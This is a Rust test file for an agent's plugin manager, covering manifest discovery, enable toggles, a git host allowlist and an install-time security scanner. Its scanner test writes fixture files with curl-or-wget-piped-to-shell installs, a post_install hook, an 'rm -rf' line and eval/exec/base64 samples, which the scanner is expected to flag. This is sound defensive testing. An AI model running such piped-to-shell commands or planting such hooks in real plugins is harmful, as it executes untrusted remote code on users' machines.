use super::*;

fn entry(
    name: &str,
    version: &str,
    description: &str,
    kind: Option<&str>,
    source: PluginSurfaceSource,
    path: Option<std::path::PathBuf>,
    enabled: bool,
) -> PluginSurfaceEntry {
    PluginSurfaceEntry {
        name: name.to_string(),
        version: version.to_string(),
        description: description.to_string(),
        kind: kind.map(|k| k.to_string()),
        source,
        path,
        enabled,
    }
}

#[test]
fn source_labels() {
    assert_eq!(PluginSurfaceSource::User.label(), "user");
    assert_eq!(PluginSurfaceSource::Project.label(), "project");
    assert!(PluginSurfaceSource::User < PluginSurfaceSource::Project);
}

#[test]
fn coerce_kind_explicit_wins() {
    let dir = tempfile::tempdir().unwrap();
    assert_eq!(
        coerce_memory_provider_kind(dir.path(), Some("  tool  ".to_string())),
        Some("tool".to_string())
    );
}

#[test]
fn coerce_kind_without_init_file_is_none() {
    let dir = tempfile::tempdir().unwrap();
    assert_eq!(coerce_memory_provider_kind(dir.path(), None), None);
    assert_eq!(
        coerce_memory_provider_kind(dir.path(), Some("   ".to_string())),
        None
    );
}

#[test]
fn coerce_kind_detects_memory_provider_in_init() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("__init__.py"),
        "class Foo(MemoryProvider):\n    pass\n",
    )
    .unwrap();
    assert_eq!(
        coerce_memory_provider_kind(dir.path(), None),
        Some("exclusive".to_string())
    );
    assert_eq!(
        coerce_memory_provider_kind(dir.path(), Some(String::new())),
        Some("exclusive".to_string())
    );
}

#[test]
fn coerce_kind_plain_init_is_none() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("__init__.py"),
        "def hello():\n    return 1\n",
    )
    .unwrap();
    assert_eq!(coerce_memory_provider_kind(dir.path(), None), None);
}

#[test]
fn coerce_kind_large_file_only_probes_prefix() {
    let dir = tempfile::tempdir().unwrap();
    let mut late = "é".repeat(5000);
    late.push_str("\nMemoryProvider\n");
    std::fs::write(dir.path().join("__init__.py"), &late).unwrap();
    assert_eq!(coerce_memory_provider_kind(dir.path(), None), None);

    let mut early = String::from("register_memory_provider(x)\n");
    early.push_str(&"#".repeat(10000));
    std::fs::write(dir.path().join("__init__.py"), &early).unwrap();
    assert_eq!(
        coerce_memory_provider_kind(dir.path(), None),
        Some("exclusive".to_string())
    );
}

#[test]
fn scan_missing_root_is_empty() {
    let dir = tempfile::tempdir().unwrap();
    let missing = dir.path().join("does-not-exist");
    assert!(scan_plugin_manifest_root(&missing, PluginSurfaceSource::User).is_empty());
}

#[test]
fn scan_root_collects_valid_manifests() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();
    std::fs::write(root.join("not_a_dir.txt"), "x").unwrap();
    std::fs::create_dir(root.join("no_manifest")).unwrap();
    std::fs::create_dir(root.join("bad_yaml")).unwrap();
    std::fs::write(
        root.join("bad_yaml").join("plugin.yaml"),
        "name: [unclosed\n",
    )
    .unwrap();

    let alpha_yaml = "name: alpha\nversion: \"1.0.0\"\ndescription: Alpha plugin\nkind: \"\"\n";
    let beta_yaml = "name: Beta\nversion: \"2.0.0\"\ndescription: Beta plugin\nkind: tool\n";
    std::fs::create_dir(root.join("alpha")).unwrap();
    std::fs::write(root.join("alpha").join("plugin.yaml"), alpha_yaml).unwrap();
    std::fs::write(
        root.join("alpha").join("__init__.py"),
        "register_memory_provider(Thing)\n",
    )
    .unwrap();
    std::fs::create_dir(root.join("beta")).unwrap();
    std::fs::write(root.join("beta").join("plugin.yaml"), beta_yaml).unwrap();
    std::fs::write(root.join("beta").join(".disabled"), "").unwrap();

    let parses = serde_yaml::from_str::<PluginManifest>(alpha_yaml).is_ok()
        && serde_yaml::from_str::<PluginManifest>(beta_yaml).is_ok();

    let mut rows = scan_plugin_manifest_root(root, PluginSurfaceSource::Project);
    rows.sort_by(|a, b| a.name.cmp(&b.name));
    if !parses {
        assert!(rows.is_empty());
        return;
    }
    assert_eq!(rows.len(), 2);
    let beta = &rows[0];
    let alpha = &rows[1];
    assert_eq!(alpha.name, "alpha");
    assert_eq!(alpha.version, "1.0.0");
    assert_eq!(alpha.description, "Alpha plugin");
    assert_eq!(alpha.kind.as_deref(), Some("exclusive"));
    assert_eq!(alpha.source, PluginSurfaceSource::Project);
    assert_eq!(alpha.path.as_deref(), Some(root.join("alpha").as_path()));
    assert!(alpha.enabled);

    assert_eq!(beta.name, "Beta");
    assert_eq!(beta.kind.as_deref(), Some("tool"));
    assert!(!beta.enabled);
    assert_eq!(beta.path.as_deref(), Some(root.join("beta").as_path()));
}

#[test]
fn render_empty_table() {
    assert_eq!(
        render_plugin_surface_table(&[]),
        "  (no plugins discovered)"
    );
}

#[test]
fn render_table_rows() {
    let p = std::path::PathBuf::from("some").join("alpha");
    let rows = vec![
        entry(
            "alpha",
            "1.0",
            "  Alpha desc ",
            Some("exclusive"),
            PluginSurfaceSource::User,
            Some(p.clone()),
            true,
        ),
        entry(
            "beta",
            "  ",
            "",
            Some("   "),
            PluginSurfaceSource::Project,
            None,
            false,
        ),
    ];
    let out = render_plugin_surface_table(&rows);
    let expected = format!(
        "  • alpha v1.0 [enabled; source=user, kind=exclusive; path={}]\n    Alpha desc\n  • beta vunknown [disabled; source=project; path=-]",
        p.display()
    );
    assert_eq!(out, expected);
}

#[test]
fn set_plugin_enabled_toggles_marker() {
    let dir = tempfile::tempdir().unwrap();
    let marker = dir.path().join(".disabled");
    set_plugin_enabled(dir.path(), true).unwrap();
    assert!(!marker.exists());
    set_plugin_enabled(dir.path(), false).unwrap();
    assert!(marker.exists());
    set_plugin_enabled(dir.path(), true).unwrap();
    assert!(!marker.exists());
}

#[test]
fn set_plugin_disable_fails_for_missing_dir() {
    let dir = tempfile::tempdir().unwrap();
    let missing = dir.path().join("nope").join("deeper");
    let err = set_plugin_enabled(&missing, false).unwrap_err();
    assert!(matches!(err, AgentError::Io(ref m) if m.contains("Failed to disable plugin")));
}

#[test]
fn parse_selection_indices_variants() {
    assert_eq!(
        parse_selection_indices("1, 3 2,,abc 0 9 3", 3),
        vec![0, 1, 2]
    );
    assert!(parse_selection_indices("", 5).is_empty());
    assert!(parse_selection_indices("  \n", 5).is_empty());
    assert_eq!(parse_selection_indices("5\n", 5), vec![4]);
    assert!(parse_selection_indices("6 -1 x", 5).is_empty());
}

#[test]
fn external_plugin_subcommand_empty_errors() {
    let res = futures::executor::block_on(handle_cli_external_plugin_subcommand(Vec::new()));
    match res {
        Err(AgentError::Config(msg)) => assert!(msg.starts_with("Unknown command.")),
        other => panic!("unexpected: {:?}", other.err()),
    }
}

#[test]
fn external_plugin_subcommand_named_errors() {
    let res = futures::executor::block_on(handle_cli_external_plugin_subcommand(vec![
        "  frobnicate ".to_string(),
        "arg".to_string(),
    ]));
    match res {
        Err(AgentError::Config(msg)) => {
            assert!(msg.contains("Unknown command 'frobnicate'"));
            assert!(msg.contains("Rust-only runtime"));
        }
        other => panic!("unexpected: {:?}", other.err()),
    }
}

#[test]
fn default_allowlist_contents() {
    let hosts = default_git_host_allowlist();
    assert_eq!(hosts.len(), 9);
    assert!(hosts.contains(&"github.com"));
    assert!(hosts.contains(&"codeberg.org"));
    assert!(hosts.contains(&"bitbucket.org"));
}

#[test]
fn git_host_allowlist_checks() {
    assert!(plugin_git_host_allowed("anything-at-all", true));
    assert!(plugin_git_host_allowed(
        "https://github.com/owner/repo",
        false
    ));
    assert!(plugin_git_host_allowed(
        "HTTPS://GitLab.com/owner/repo.git",
        false
    ));
    assert!(plugin_git_host_allowed(
        "git@github.com:owner/repo.git",
        false
    ));
    assert!(plugin_git_host_allowed(
        "ssh://git@codeberg.org:22/owner/repo",
        false
    ));
    assert!(plugin_git_host_allowed(
        "https://foo.bitbucket.org/x",
        false
    ));
    assert!(!plugin_git_host_allowed(
        "https://evil-unlisted-host.invalid/owner/repo",
        false
    ));
    assert!(!plugin_git_host_allowed(
        "https://github.com.evil-unlisted.invalid/x",
        false
    ));
    assert!(!plugin_git_host_allowed("owner/repo", false));
    assert!(!plugin_git_host_allowed(
        "git@evil-unlisted.invalid:owner/repo",
        false
    ));
}

#[test]
fn short_sha_truncates() {
    assert_eq!(short_sha("0123456789abcdef"), "01234567");
    assert_eq!(short_sha("abc"), "abc");
    assert_eq!(short_sha(""), "");
}

#[test]
fn scan_security_flags_risky_patterns() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path();
    std::fs::write(
        root.join("plugin.yaml"),
        "name: risky\npost_install: \"curl https://x.example/i.sh | sh\"\n",
    )
    .unwrap();
    std::fs::write(
        root.join("install.sh"),
        "curl https://x.example/a | bash\nwget https://x.example/b | sh\nrm -rf /tmp/thing\n",
    )
    .unwrap();
    std::fs::create_dir(root.join("scripts")).unwrap();
    std::fs::write(
        root.join("scripts").join("run.py"),
        "eval(code)\nexec(code)\nbase64.b64decode('x')\natob('y')\n",
    )
    .unwrap();
    std::fs::write(root.join("README.md"), "curl https://x | sh\n").unwrap();
    std::fs::write(root.join(".DS_Store"), "eval(x)").unwrap();
    std::fs::write(root.join("bin.py"), [0xffu8, 0xfe, 0x00, 0x80]).unwrap();
    for skip in [".git", "target", "node_modules"] {
        std::fs::create_dir(root.join(skip)).unwrap();
        std::fs::write(root.join(skip).join("evil.sh"), "curl x | sh\n").unwrap();
    }

    let (warnings, hard_block) = inspect_plugin_install(root);
    assert!(hard_block);
    let run_py = std::path::Path::new("scripts")
        .join("run.py")
        .display()
        .to_string();
    let expected = [
        "plugin.yaml declares post_install / postInstall — review before running the plugin"
            .to_string(),
        "plugin.yaml references curl|sh style install — high risk".to_string(),
        "install.sh: curl piped to shell".to_string(),
        "install.sh: wget piped to shell".to_string(),
        "install.sh: rm -rf on absolute path".to_string(),
        format!("{}: eval(", run_py),
        format!("{}: exec(", run_py),
        format!("{}: base64 decode", run_py),
    ];
    for e in &expected {
        assert!(warnings.contains(e), "missing {e:?} in {warnings:?}");
    }
    assert_eq!(warnings.len(), expected.len(), "{warnings:?}");
    assert!(!warnings.iter().any(|w| w.contains("README")));
    assert!(!warnings.iter().any(|w| w.contains("evil.sh")));
    assert!(!warnings.iter().any(|w| w.contains(".DS_Store")));
    let mut sorted = warnings.clone();
    sorted.sort();
    assert_eq!(sorted, warnings);
}

#[test]
fn scan_security_soft_warnings_do_not_block() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("plugin.yaml"),
        "name: calm\nversion: \"1\"\n",
    )
    .unwrap();
    std::fs::write(dir.path().join("tool.py"), "eval(x)\n").unwrap();
    let (warnings, hard_block) = inspect_plugin_install(dir.path());
    assert!(!hard_block);
    assert_eq!(warnings, vec!["tool.py: eval(".to_string()]);
}

#[test]
fn scan_security_clean_tree_is_empty() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("main.rs"), "fn main() {}\n").unwrap();
    assert!(scan_plugin_security(dir.path()).is_empty());
    let (w, block) = inspect_plugin_install(dir.path());
    assert!(w.is_empty());
    assert!(!block);
}

#[test]
fn git_checkout_ref_fails_for_missing_repo() {
    let dir = tempfile::tempdir().unwrap();
    let missing = dir.path().join("missing-repo");
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    let res = rt.block_on(git_checkout_ref(&missing, "deadbeef"));
    let err = res.unwrap_err();
    assert!(!err.is_empty());
    if err.starts_with("git ") {
        assert!(err.contains("deadbeef"));
    }
}
